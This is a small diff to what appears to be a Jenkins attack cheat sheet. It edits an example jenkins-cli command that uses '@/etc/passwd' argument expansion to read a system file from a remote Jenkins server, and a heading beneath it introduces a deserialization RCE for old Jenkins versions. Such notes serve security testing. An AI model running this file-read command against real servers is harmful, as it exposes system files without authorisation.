@@ -22,7 +22,7 @@ java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins enable-
 ```
 Read third line:
 ```
-java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins help "@/etc/passwd"
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins keep-build "@/etc/passwd"
 ```
 
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
